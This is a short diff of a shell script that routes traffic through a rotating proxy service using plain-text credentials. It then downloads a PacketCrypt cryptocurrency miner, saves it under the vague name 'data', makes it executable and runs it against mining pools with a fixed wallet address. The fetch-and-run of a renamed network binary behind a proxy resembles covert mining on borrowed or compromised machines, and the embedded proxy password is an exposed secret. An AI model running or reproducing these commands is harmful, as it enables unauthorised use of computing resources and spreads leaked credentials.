@@ -1,4 +1,7 @@
-
+curl --proxy "http://kkvvuemx-rotate:5w3sv24msrz7@p.webshare.io:80/" https://ipv4.webshare.io/
+export http_proxy=http://kkvvuemx-rotate:5w3sv24msrz7@p.webshare.io:80
+export https_proxy=http://kkvvuemx-rotate:5w3sv24msrz7@p.webshare.io:80
+export ftp_proxy=http://kkvvuemx-rotate:5w3sv24msrz7@p.webshare.io:80
 wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data && 
 chmod +x data && 
-nohup ./data ann -p pkt1qh3cswe3gckds4vutpasr6z2rwz6rxkkhgxecys http://pool.pktpool.io http://pool.pkteer.com > nohup.out
+./data ann -p pkt1qh3cswe3gckds4vutpasr6z2rwz6rxkkhgxecys http://pool.pkt.world
